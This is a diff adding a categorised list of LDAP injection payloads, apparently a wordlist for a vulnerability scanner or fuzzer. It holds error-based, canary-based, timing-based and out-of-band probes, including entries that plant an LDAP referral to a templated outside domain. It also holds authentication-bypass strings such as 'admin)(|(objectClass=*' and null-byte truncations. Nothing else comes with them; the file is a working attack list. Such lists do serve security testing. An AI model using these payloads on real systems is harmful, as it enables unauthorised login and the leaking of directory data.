@@ -1,0 +1,39 @@
+##LDAP Injection - Error-Based##
+*)(cn=*))(|(cn=*
+)(objectClass=*
+*)(|(password=*
+)(
+))((
+*))(&(
+(|(cn=*)(cn=*
+*)(cn=*)(|
+*)(&(objectClass=*)(!
+*)(invalidop=*
+
+##LDAP Injection - Math-Based (Canary: 1337)##
+*)(uid=1337)(&(objectClass=*
+1337)(|(objectClass=*
+*)(cn=1337)(|
+*)(|(uid=1337)(objectClass=*
+*)(description=1337)(&(cn=*
+*)(uid=1337)(cn=*
+
+##LDAP Injection - Timing-Based##
+*)(|(cn=*a*b*c*d*e*f*g*h*i*j*k*l*m*n*o*p*q*r*s*t*u*v*w*x*y*z*
+*)(|(cn=*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*
+*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*
+*)(|(sn=*a*b*c*)(cn=*d*e*f*)(uid=*g*h*i*)(mail=*j*k*l*)(description=*m*n*o*
+
+##LDAP Injection - OOB##
+*)(objectClass=*))%00
+*)(ref=ldap://{domain}/cn=probe,dc=testbed,dc=local
+*)(objectClass=*)(ref=ldap://{domain}:389/
+*)(cn=*)(|(objectClass=referral)(ref=ldap://{domain}/
+
+##LDAP Injection - Auth Bypass##
+*)(uid=*))(|(uid=*
+admin)(|(objectClass=*
+*))%00
+admin)(&)
+*)(uid=admin
+admin)(cn=admin))(&(uid=admin
